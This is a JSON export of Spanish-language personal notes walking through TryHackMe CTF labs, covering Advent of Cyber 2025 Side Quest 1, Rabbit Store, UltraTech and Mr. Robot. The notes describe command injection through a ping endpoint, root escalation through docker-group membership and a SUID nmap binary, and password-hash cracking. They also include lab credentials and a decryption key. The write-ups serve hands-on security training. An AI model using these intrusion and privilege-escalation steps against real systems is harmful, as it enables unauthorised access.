    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/2-side-quest-1/2-side-quest-1/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/2. Side Quest 1/2. Side Quest 1.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 2. Side Quest 1",
    "content": "1. [[0. Side Quest 1]]\n2. [[0. Side Quest 1 Machine]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/2-side-quest-1/2-side-quest-1-machine/1-introduction/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/2. Side Quest 1/2. Side Quest 1 Machine/1. Introduction.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 2. Side Quest 1 > 2. Side Quest 1 Machine",
    "content": "![[Pasted image 20251203014228.png]]\n\n<h2>Hopper, el buf√≥n de la corte</h2>\n√ârase una vez un genio del equipo rojo convertido en buf√≥n de la corte... nuestra historia comienza con Hopper. Anta√±o temido como el despiadado Jefe del Batall√≥n de Conejitos del Equipo Rojo, Hopper ascendi√≥ al rango de Coronel con una velocidad vertiginosa. El ascenso lo llen√≥ de tal euforia y ansia que consum√≠a cada pensamiento. Sus soldados confundieron su creciente tic con estr√©s y comenzaron a llamarlo \"Coronel P√°nico\", pero la verdad era mucho m√°s peligrosa: el tic proven√≠a de su obsesi√≥n por el poder, no por el miedo.\n\nEn aquellos d√≠as, Hopper ya hab√≠a desempe√±ado un papel crucial, aunque convenientemente olvidado, en los primeros rumores del asedio de Wareville. Enterrados bajo el secreto y negados por la corona, esos primeros experimentos para traspasar las nuevas fronteras digitales fueron dise√±o de Hopper. Pero cuando el Rey comenz√≥ a distanciarse de la verdad, las contribuciones de Hopper fueron borradas discretamente de la historia y su ca√≠da en desgracia se aceler√≥. Ahora encontramos a Hopper en su celda en el Asilo HopSec.\n\nEste reto se desbloquea encontrando la llave de la Side Quest 1 en el [[1. Day 1]]. Si has sido lo suficientemente audaz, puedes desbloquear la m√°quina yendo a `<IP>:21337` e introduciendo la clave. ¬°Buena suerte!",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Escape",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/2-side-quest-1/2-side-quest-1-machine/2-escape/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/2. Side Quest 1/2. Side Quest 1 Machine/2. Escape.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 2. Side Quest 1 > 2. Side Quest 1 Machine",
    "content": "<h2>Escape del Asilo</h2>\nAhora tomas control de Hopper, con un √∫ltimo objetivo. Liberarte de este encarcelamiento injusto. Para hacerlo, debes seguir el plan de 5 pasos de Hopper.\n\n![[Pasted image 20251203014802.png]]\n\n<h2>1. Desbloquea la Celda de Hopper</h2>\nTu escapada comienza en el √°rea de celdas y almacenamiento. Hopper est√° atrapado dentro y la puerta est√° securizada con una cerradura digital. Tu primera tarea es acceder a los controles de la celda y desbloquear su puerta. Una vez que Hopper sea libre puedes empezar a moverte por el lobby.\n<h2>2. Mu√©vete por el Lobby</h2>\nCon la celda desbloqueada, dir√≠gete directamente al lobby. Esta zona conecta los diferentes bloques de las instalaciones. Hay c√°maras activas, as√≠ que estate atento. Tu objetivo es llegar a la entrada del pabell√≥n de psiquiatr√≠a, en el lado este del vest√≠bulo.\n<h2>3. Bypassea el Teclado del Pabell√≥n de Psiquiatr√≠a</h2>\nLa sala de psiquiatr√≠a est√° protegida por un teclado. Debes identificar el c√≥digo correcto o explotar el teclado para continuar. Una vez que lo omitas, acceder√°s al pasillo de salida de la sala de psiquiatr√≠a.\n<h2>4. Alcanza el Pasillo Principal</h2>\nDesde la salida de la sala de psiquiatr√≠a, puedes dirigirte al sur y dar una vuelta hacia el pasillo principal. Esta es la √∫ltima secci√≥n de la ruta de escape. El √∫ltimo desaf√≠o te espera aqu√≠, y al completarlo abrir√°s la √∫ltima puerta de salida.\n<h2>5. Escapa de las Instalaciones</h2>\nResuelve el desaf√≠o final en el pasillo principal y dir√≠gete a la salida marcada en el mapa. Una vez que la puerta se abra, Hopper quedar√° libre y la huida habr√° terminado.\n\n---------------------------------------------------------",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Side Quest 1 Machine",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/2-side-quest-1/2-side-quest-1-machine/0-side-quest-1-machine/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/2. Side Quest 1/2. Side Quest 1 Machine/0. Side Quest 1 Machine.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 2. Side Quest 1 > 2. Side Quest 1 Machine",
    "content": "[[Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/2. Side Quest 1/2. Side Quest 1 Machine/1. Introduction]]\n[[2. Escape]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/2-side-quest-1/1-flag-discovery/1-introduction/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/2. Side Quest 1/1. Flag Discovery/1. Introduction.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 2. Side Quest 1 > 1. Flag Discovery",
    "content": "Se nos presenta este reto con el siguiente texto como pista:\n\n```txt\nFrom: mcskidy\nTo: whoever finds this\n\nI had a short second when no one was watching. I used it.\n\nI've managed to plant a few clues around the account. If you can get into the user below and look carefully, those three little \"easter eggs\" will combine into a passcode that unlocks a further message that I encrypted in the /home/eddi_knapp/Documents/ directory.\nI didn't want the wrong eyes to see it.\n\nAccess the user account:\nusername: eddi_knapp\npassword: S0mething1Sc0ming\n\nThere are three hidden easter eggs.\nThey combine to form the passcode to open my encrypted vault.\n\nClues (one for each egg):\n\n1)\nI ride with your session, not with your chest of files.\nOpen the little bag your shell carries when you arrive.\n\n2)\nThe tree shows today; the rings remember yesterday.\nRead the ledger‚Äôs older pages.\n\n3)\nWhen pixels sleep, their tails sometimes whisper plain words.\nListen to the tail.\n\nFind the fragments, join them in order, and use the resulting passcode\nto decrypt the message I left. Be careful ‚Äî I had to be quick,\nand I left only enough to get help.\n\n~ McSkidy\n```\n\nTraducci√≥n:\n\n```txt\nDe: mcskidy\nPara: quien encuentre esto\n\nTuve un breve segundo sin que nadie me viera. Lo aprovech√©.\n\nHe conseguido colocar algunas pistas en la cuenta.\nSi puedes acceder al usuario de abajo y mirar con atenci√≥n,\nesos tres peque√±os \"huevos de pascua\" se combinar√°n para formar un c√≥digo de acceso que desbloquea otro mensaje que cifr√© en el directorio\n/home/eddi_knapp/Documents/.\nNo quer√≠a que lo vieran personas indeseadas.\n\nAccede a la cuenta de usuario:\nnombre de usuario: eddi_knapp\ncontrase√±a: S0mething1Sc0ming\n\nHay tres huevos de pascua ocultos.\nSe combinan para formar el c√≥digo de acceso para abrir mi b√≥veda cifrada.\n\nPistas (una por cada huevo):\n\n1)\nViajo con tu sesi√≥n, no con tu ba√∫l de archivos.\nAbre la bolsita que lleva tu shell cuando llegas.\n\n2)\nEl √°rbol muestra el hoy; los anillos recuerdan el ayer. Lee las p√°ginas antiguas del registro.\n\n3)\nCuando los p√≠xeles duermen, sus colas a veces susurran palabras sencillas.\nEscucha la cola.\n\nEncuentra los fragmentos, √∫nelos en orden y usa la contrase√±a resultante para descifrar el mensaje que dej√©. Ten cuidado: ten√≠a que ser r√°pido y solo dej√© lo suficiente para pedir ayuda.\n\n~McSkidy\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Side Quest 1",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/2-side-quest-1/1-flag-discovery/0-side-quest-1/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/2. Side Quest 1/1. Flag Discovery/0. Side Quest 1.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 2. Side Quest 1 > 1. Flag Discovery",
    "content": "[[Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/2. Side Quest 1/1. Flag Discovery/1. Introduction]]\n[[2. Finding the Fragments]]\n[[3. Finding the Flag]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Finding the Fragments",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/2-side-quest-1/1-flag-discovery/2-finding-the-fragments/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/2. Side Quest 1/1. Flag Discovery/2. Finding the Fragments.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 2. Side Quest 1 > 1. Flag Discovery",
    "content": "1. Iniciamos sesi√≥n en la cuenta de eddi.\n   ![[Pasted image 20251203005439.png]]\n2. La primera pista nos habla de algo que va con nuestra sesi√≥n y no con nuestros archivos, por lo que se nos viene a la cabeza la configuraci√≥n de Bash. Eso siempre est√° con nuestra shell cuando llegamos.\n   ![[Pasted image 20251203005623.png]]\n3. La segunda pista nos habla de un \"√°rbol\" que podr√≠a interpretarse como el comando `tree`. Sin embargo el hecho de que haga referencia a cosas pasadas nos indica que debe ser alg√∫n tipo de log.\n\t1. Vamos a listar todos los directorios.\n\t   ![[Pasted image 20251203005747.png]]\n\t2. Enseguida hay uno que nos llama la atenci√≥n: `.secret`.\n\t   ![[Pasted image 20251203005825.png]]\n\t   Parece que hay un archivo gpg cifredo al que no tenemos acceso todav√≠a.\n\t3. Pero vemos un directorio `.secret_git`. Github tiene un historial de commits, tiraremos por ah√≠.\n\t   ![[Pasted image 20251203010005.png]]\n\t   Parece un commit interesante, ¬øno? Ojal√° hubiera una forma de recuperarlo...\n\t4. Espera, tenemos el hash de commit justo al lado.\n\t   ![[Pasted image 20251203010133.png]]\n4. La tercera pista nos dice algo sobre p√≠xeles y colas (tails). Podr√≠a ser algo relacionado con el comando `tail`.\n\t1. Si investigamos un poco podemos ver lo siguiente.\n\t   ![[Pasted image 20251203010325.png]]\n\t2. Vamos a leer los documentos.\n\t   ![[Pasted image 20251203010420.png]]\n\t   Parece que no hay nada interesante, pero ya que habla de fotos vamos a ver qu√© hay en ese directorio.\n\t3. Vamos al directorio y usamos `ls -la`.\n\t   ![[Pasted image 20251203010516.png]]\n\t   Parece que hemos encontrado un archivo oculto.\n\t4. Vamos a leerlo.\n\t   ![[Pasted image 20251203010550.png]]\n5. Con esto ya tenemos los tres fragmentos\n\t1. `3ast3r`\n\t2. `-1s-`\n\t3. `c0M1nG`\n6. Vamos a descifrar el documento del que nos hablaba en la pista del principio.\n\t1. Introducimos el comando para desencriptar de GPG.\n\t   ![[Pasted image 20251203010815.png]]\n\t2. Introducimos la contrase√±a.\n\t   ![[Pasted image 20251203010843.png]]\n\t3. Leemos el documento.\n\t   ![[Pasted image 20251203010916.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Finding the Flag",
    "path": "/apuntes/thm/advent-of-cyber/2025/1-day-1/2-side-quest-1/1-flag-discovery/3-finding-the-flag/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/2025/1. Day 1/2. Side Quest 1/1. Flag Discovery/3. Finding the Flag.md",
    "breadcrumb": "THM > Advent of Cyber > 2025 > 1. Day 1 > 2. Side Quest 1 > 1. Flag Discovery",
    "content": "Una vez encontrados los fragmentos y desciframos la nota de Mc Skidy, obtenemos la siguiente pista:\n\n```txt\nCongrats ‚Äî you found all fragments and reached this file.\n\nBelow is the list that should be live on the site. If you replace the contents of /home/socmas/2025/wishlist.txt with this exact list (one item per line, no numbering), the site will recognise it and the takeover glitching will stop. Do it ‚Äî it will save the site.\n\nHardware security keys (YubiKey or similar)\nCommercial password manager subscriptions (team seats)\nEndpoint detection & response (EDR) licenses\nSecure remote access appliances (jump boxes)\nCloud workload scanning credits (container/image scanning)\nThreat intelligence feed subscription\n\nSecure code review / SAST tool access\nDedicated secure test lab VM pool\nIncident response runbook templates and playbooks\nElectronic safe drive with encrypted backups\n\nA final note ‚Äî I don't know exactly where they have me, but there are *lots* of eggs and I can smell chocolate in the air. Something big is coming.  \n\n‚Äî McSkidy\n\n---\n\nWhen the wishlist is corrected, the site will show a block of ciphertext. This ciphertext can be decrypted with the following unlock key:\n\nUNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z\n\nTo decode the ciphertext, use OpenSSL. For instance, if you copied the ciphertext into a file /tmp/website_output.txt you could decode using the following command:\n\ncat > /tmp/website_output.txt\nopenssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in /tmp/website_output.txt -out /tmp/decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'\ncat /tmp/decoded_message.txt\n\nSorry to be so convoluted, I couldn't risk making this easy while King Malhare watches. \n\n‚Äî McSkidy\n```\n\nTraducci√≥n:\n\n```txt\n¬°Felicidades! Has encontrado todos los fragmentos y has llegado a este archivo.\n\nA continuaci√≥n se muestra la lista que deber√≠a estar activa en el sitio. Si reemplazas el contenido de /home/socmas/2025/wishlist.txt con esta misma lista (un elemento por l√≠nea, sin numeraci√≥n), el sitio lo reconocer√° y el fallo de glitch se detendr√°. Hazlo ‚Äî salvar√°s el sitio.\n\nHardware security keys (YubiKey or similar)\nCommercial password manager subscriptions (team seats)\nEndpoint detection & response (EDR) licenses\nSecure remote access appliances (jump boxes)\nCloud workload scanning credits (container/image scanning)\nThreat intelligence feed subscription\n\nSecure code review / SAST tool access\nDedicated secure test lab VM pool\nIncident response runbook templates and playbooks\nElectronic safe drive with encrypted backups\n\nUna nota final: No s√© exactamente d√≥nde me tienen, pero hay *much√≠simos* huevos y huelo chocolate en el aire. ¬°Algo grande se avecina! \n\n‚Äî McSkidy\n\n---\n\nCuando se corrija la lista de deseos, el sitio mostrar√° un bloque de texto cifrado. Este texto cifrado se puede descifrar con la siguiente clave de desbloqueo:\n\nCLAVE_DE_DESBLOQUEO:'91J6X7R4FQ9TQPM9JX2Q9X2Z'\n\nPara decodificar el texto cifrado, use OpenSSL. Por ejemplo, si copi√≥ el texto cifrado en el archivo /tmp/website_output.txt, podr√≠a decodificarlo con los siguientes comandos:\n\ncat > /tmp/website_output.txt\n\nopenssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in /tmp/website_output.txt -out /tmp/decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'\n\ncat /tmp/decoded_message.txt\n\nDisculpa la complejidad, pero no pod√≠a arriesgarme a simplificarlo mientras el rey Malhare observaba.\n\n‚Äî McSkidy\n```\n\nCon esta pista vamos a averiguar la flag.\n\n------------------------------------------\n1. Escaneamos el sitio.\n   ![[Pasted image 20251203011751.png]]\n2. Como el puerto 80 no arroja una web v√°lida vamos al puerto 8080.\n   ![[Pasted image 20251203011922.png]]\n   Aqu√≠ est√° la p√°gina de la que nos hablaba la pista (y bastante glitcheada).\n3. Vamos a seguir las instrucciones que nos dan.\n\t1. Podemos editar dicho archivo porque eddi forma parte de los editores de socmas.\n\t   ![[Pasted image 20251203012105.png]]\n\t2. Copiamos el contenido que nos dan linea a linea y lo pegamos en `home/socmas/2025/wishlist.txt`.\n\t   ![[Pasted image 20251203012317.png]]\n\t3. Recargamos la p√°gina con `Ctrl+Shift+R`.\n\t   ![[Pasted image 20251203012411.png]]\n\t4. Guardamos el hash en un archivo.\n\t   ![[Pasted image 20251203012559.png]]\n\t5. Usamos el comando de `openssl` que nos dan.\n\t   ![[Pasted image 20251203012727.png]]\n\t6. Leemos el archivo.\n\t   ![[Pasted image 20251203012833.png]]\n4. Hacemos lo que nos dice la nota para encontrar la llave de la sidequest.\n\t1. Primero vamos al directorio y metemos el comando de desencriptar con gpg.\n\t   ![[Pasted image 20251203013021.png]]\n\t2. Introducimos la flag.\n\t   ![[Pasted image 20251203013135.png]]\n\t3. Desempaquetamos el archivo.\n\t   ![[Pasted image 20251203013228.png]]\n\t4. Miramos a ver qu√© hay en dir.\n\t   ![[Pasted image 20251203013325.png]]\n\t5. Nos lo pasamos a nuestra m√°quina.\n\t\t1. Lo servimos con Python.\n\t\t   ![[Pasted image 20251203013417.png]]\n\t\t2. Lo descargamos con `wget`.\n\t\t   ![[Pasted image 20251203013530.png]]\n\t\t3. Podemos ver que la petici√≥n ha sido correcta.\n\t\t   ![[Pasted image 20251203013549.png]]\n\t6. Lo abrimos.\n\t   ![[Pasted image 20251203013632.png]]\n\n\n>[!SUCCESS] Acabamos de obtener la clave para la m√°quina Side Quest 1.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Insane",
    "path": "/apuntes/thm/maquinas/4-insane/4-insane/",
    "src": "content/Ciberseguridad/THM/Maquinas/4. Insane/4. Insane.md",
    "breadcrumb": "THM > Maquinas > 4. Insane",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Hard",
    "path": "/apuntes/thm/maquinas/3-hard/3-hard/",
    "src": "content/Ciberseguridad/THM/Maquinas/3. Hard/3. Hard.md",
    "breadcrumb": "THM > Maquinas > 3. Hard",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Medium",
    "path": "/apuntes/thm/maquinas/2-medium/2-medium/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/2. Medium.md",
    "breadcrumb": "THM > Maquinas > 2. Medium",
    "content": "1. [[0. Mr. Robot CTF]]\n2. [[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge]]\n3. [[0. Revenge]]\n4. [[0. Rabbit Store]]\n5. [[0. Ultra Tech]]\n6. [[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer]]\n7. [[Ciberseguridad/THM/Maquinas/2. Medium/7. Include/0. Include]]\n8. [[Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/0. Injectics]]\n9.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Easy",
    "path": "/apuntes/thm/maquinas/1-easy/1-easy/",
    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/1. Easy.md",
    "breadcrumb": "THM > Maquinas > 1. Easy",
    "content": "1. [[Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/0. Vulnerability Capstone]]\n2. [[Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/0. Pickle Rick]]\n3. [[0. Lookup]]\n4. [[0. Res]]\n5. [[0. Brooklyn Nine Nine]]\n6. [[0. TakeOver]]\n7. [[0. Overpass]]\n8.",
    "modified": "2025-12-21T00:57:17"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/2-medium/4-rabbit-store/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/4. Rabbit Store/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 4. Rabbit Store",
    "content": "![[Pasted image 20251123154340.png]]\nEn esta m√°quina se nos pide encontrar el contenido de:\n\n- user.txt\n- root.txt",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Rabbit Store",
    "path": "/apuntes/thm/maquinas/2-medium/4-rabbit-store/0-rabbit-store/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/4. Rabbit Store/0. Rabbit Store.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 4. Rabbit Store",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/4. Rabbit Store/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/2. Medium/4. Rabbit Store/2. Finding the flags]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Finding the flags",
    "path": "/apuntes/thm/maquinas/2-medium/4-rabbit-store/2-finding-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/4. Rabbit Store/2. Finding the flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 4. Rabbit Store",
    "content": "1. Vamos a escanear la IP que nos dan.\n   ![[Pasted image 20251123154638.png]]\n2. Vamos a mirar qu√© es el servicio epmd.\n   ![[Pasted image 20251123154913.png]]\n   Esto puede ser interesante m√°s adelante. Como aparece open sabemos que en principio no hay un firewall.\n3. Vamos a escanear los puertos abiertos.\n   ![[Pasted image 20251123155400.png]]\n4. Vamos a ver la p√°gina web.\n   ![[Pasted image 20251123155551.png]]\n   Al escribir esta direcci√≥n nos redirige a:\n   ![[Pasted image 20251123155618.png]]\n5. Vamos a a√±adirla en nuestro `/etc/hosts`.\n   ![[Pasted image 20251123155749.png]]\n6. Volvemos a la p√°gina.\n   ![[Pasted image 20251123155825.png]]\n   Ahora s√≠ obtenemos la p√°gina web.\n7. Exploramos la p√°gina con una herramienta de descubrimiento activo como `gobuster`.\n   ![[Pasted image 20251123160442.png]]\n   Adem√°s, hemos encontrado movi√©ndonos entre botones en la web la p√°gina de contacto que podr√≠a llegar a ser susceptible de XSS. \n8. Tambi√©n hay un apartado de login, pero no nos ha dejado entrar, por lo que inspeccionaremos el bot√≥n.\n   ![[Pasted image 20251123160721.png]]\n9. Vamos a meter este subdominio en nuestro `/etc/hosts` y a ir a ver qu√© hay.\n\t1. Tenemos la p√°gina de login.\n\t   ![[Pasted image 20251123161635.png]]\n\t2. Y la p√°gina de register.\n\t   ![[Pasted image 20251123161702.png]]\n10. Vamos a ver qu√© pasa si intentamos registrarnos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Enumeration Time",
    "path": "/apuntes/thm/maquinas/2-medium/5-ultra-tech/2-enumeration-time/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/5. Ultra Tech/2. Enumeration Time.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 5. Ultra Tech",
    "content": "1. ¬øQu√© software est√° usando el puerto 8081?\n   ![[Pasted image 20251124195639.png]]\n2. ¬øQu√© otro puerto no est√°ndar est√° siendo usado?\n   ![[Pasted image 20251124195529.png]]\n3. ¬øQu√© software usa ese puerto?\n   ![[Pasted image 20251124195842.png]]\n4. ¬øQu√© distro de GNU/Linux est√° us√°ndose?\n   Ubuntu. Lo dice en el servicio del puerto 31331.\n5. El software usando el puerto 8081 es una api REST, ¬øcu√°ntas de sus rutas son usadas por la aplicaci√≥n web?\n   ![[Pasted image 20251124200053.png]]\n   Son 2, las que se ven ah√≠.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/maquinas/2-medium/5-ultra-tech/1-introduction/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/5. Ultra Tech/1. Introduction.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 5. Ultra Tech",
    "content": "![[Pasted image 20251124192306.png]]\n\nEsta m√°quina est√° inspirada en vulnerabilidades reales encontradas durante an√°lisis de seguridad.\n\n-------------------------\n<h2>Tu misi√≥n</h2>\nHas sido contratado por UltraTech para poner a prueba su infraestructura. Es un tipo de reto grey-box. La √∫nica informaci√≥n que sabes es el nombre de la compa√±√≠a y la direcci√≥n IP de su servidor.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Ultra Tech",
    "path": "/apuntes/thm/maquinas/2-medium/5-ultra-tech/0-ultra-tech/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/5. Ultra Tech/0. Ultra Tech.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 5. Ultra Tech",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/5. Ultra Tech/1. Introduction]]\n[[2. Enumeration Time]]\n[[3. Let the Fun Begin]]\n[[4. The Root of All Evil]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. The Root of All Evil",
    "path": "/apuntes/thm/maquinas/2-medium/5-ultra-tech/4-the-root-of-all-evil/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/5. Ultra Tech/4. The Root of All Evil.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 5. Ultra Tech",
    "content": "1. ¬øCu√°les son los 9 primeros d√≠gitos de la clave privada SSH del usuario root?\n\t1. Vamos a iniciar sesi√≥n por SSH con el usuario y la contrase√±a que obtuvimos antes.\n\t   ![[Pasted image 20251124204816.png]]\n\t2. Miraremos qu√© comandos podemos utilizar.\n\t   ![[Pasted image 20251124204921.png]]\n\t3. No podemos usar `sudo -l`. Sin embargo, podemos ver, usando el comando `id`, que estamos en el grupo `docker`.\n\t   ![[Pasted image 20251124205013.png]]\n\t4. Vamos a ver qu√© im√°genes hay.\n\t   ![[Pasted image 20251124205126.png]]\n\t5. Vamos a [GTFOBins](https://gtfobins.github.io/) y buscamos `docker`.\n\t   ![[Pasted image 20251124205332.png]]\n\t6. Encontramos una forma de spawnear una shell de root.\n\t   ![[Pasted image 20251124205421.png]]\n\t7. Lo ejecutamos.\n\t   ![[Pasted image 20251124205530.png]]\n\t   En nuestro caso usamos bash porque era la imagen que estaba disponible.\n\t8. Buscamos la clave privada SSH y sacamos los primeros 9 caracteres.\n\t   ![[Pasted image 20251124205652.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Let the Fun Begin",
    "path": "/apuntes/thm/maquinas/2-medium/5-ultra-tech/3-let-the-fun-begin/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/5. Ultra Tech/3. Let the Fun Begin.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 5. Ultra Tech",
    "content": "Ahora que sabes qu√© servicios est√°n disponibles es hora de explotarlos.\n\n------------------\n1. Hay una base de datos por alg√∫n lado, ¬øcu√°l es su filename?\n\t1. Vamos a la URL de la base de datos.\n\t   ![[Pasted image 20251124200959.png]]\n\t2. Vamos a enumerar las p√°ginas de esta URL.\n\t   ![[Pasted image 20251124202106.png]]\n\t   Parece que `robots.txt` est√° disponible, vamos a mirar a ver qu√© hay en ella.\n\t3. Vamos a `http:<ip>:31331/robots.txt`.\n\t   ![[Pasted image 20251124202221.png]]\n\t4. Seguimos los puntos que vamos obteniendo.\n\t   ![[Pasted image 20251124202256.png]]\n\t5. En la √∫nica que hay algo interesante es en partners.html.\n\t   ![[Pasted image 20251124202343.png]]\n\t   Parece que hemos encontrado el √°rea de login.\n\t6. Vamos a intentar entrar con `test`:`test`.\n\t   ![[Pasted image 20251124202428.png]]\n\t   Despu√©s de trastear un poco con Burp Suite nos damos cuenta de que por aqu√≠ no llegamos a ning√∫n lado. Ni siquiera con hydra, no obtenemos ninguna contrase√±a para los usuarios obtenidos de la primera p√°gina:\n\t\t- r00t\n\t\t- P4c0\n\t\t- Sq4l\n\t7. Por esto volvemos a la p√°gina de inicio de sesi√≥n a ver si nos hemos dejado algo, vamos a inspeccionar la p√°gina.\n\t   ![[Pasted image 20251124202916.png]]\n\t   Aqu√≠ no parece haber nada, vamos a ver en la secci√≥n de red.\n\t8. Nos metemos en la secci√≥n de red de las herramientas de desarrollador.\n\t   ![[Pasted image 20251124203009.png]]\n\t   Parece que est√° llamando a una funci√≥n, vamos a investigarlo.\n\t9. Vamos a intentar hacer ping a la m√°quina localhost del servidor.\n\t   ![[Pasted image 20251124203154.png]]\n\t   Pues parece que podemos inyectar comandos.\n\t10. Vamos a intentar listar archivos.\n\t    ![[Pasted image 20251124203510.png]]\n\t    Hemos encontrado el filename.\n2. ¬øCu√°l es el hash de la contrase√±a del primer usuario?\n\t1. Vamos a leer el archivo `utech.db.sqlite`.\n\t   ![[Pasted image 20251124204342.png]]\n\t2. Sabemos que hay un usuario llamado `r00t` gracias a la p√°gina principal, por lo que el hash debe ser lo que sigue.\n\t   ![[Pasted image 20251124204431.png]]\n3. ¬øCu√°l es la contrase√±a asociada a este hash?\n\t1. Para crackear la contrase√±a vamos a ir a [CrackStation](https://crackstation.net/).\n\t   ![[Pasted image 20251124204534.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. What is Key 3",
    "path": "/apuntes/thm/maquinas/2-medium/1-mr-robot/3-what-is-key-3/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/1. Mr. Robot/3. What is Key 3.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 1. Mr. Robot",
    "content": "1. ![[020 1.png]]\nUna vez que ya hemos sacado la segunda flag, es hora de rootear la m√°quina. Para ello primero intentamos ver si podemos ejecutar alg√∫n comando con sudo (no es el caso esta vez :'(    ). Entonces intentamos buscar archivos con permiso SUID. Y vemos algo \"interesante\". Nmap no deber√≠a tener permisos SUID.\n2. Haciendo una b√∫squeda r√°pida en [GTFOBins](https://gtfobins.github.io/), vemos que efectivamente esto se puede explotar.\n3. ![[021 1.png]]\nVemos que hay una manera extremadamente sencilla de ejecutar comandos (si la versi√≥n coincide), por lo que hacemos `nmap --version` y bingo! La versi√≥n instalada es la 3.81, coincide con los criterios, al l√≠o!\n4. ![[022 1.png]]\nPues en un abrir y cerrar de ojos somos **root**.\n5. ![[023 1.png]]\nPues s√≥lo nos quedaba encontrar el documento de la √∫ltima flag, que ten√≠a pinta que iba a estar en `/root`. Y as√≠ era.\n\n-------\n<h2>M√°quina pwneada!!!!</h2>",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is Key 1",
    "path": "/apuntes/thm/maquinas/2-medium/1-mr-robot/1-what-is-key-1/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/1. Mr. Robot/1. What is Key 1.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 1. Mr. Robot",
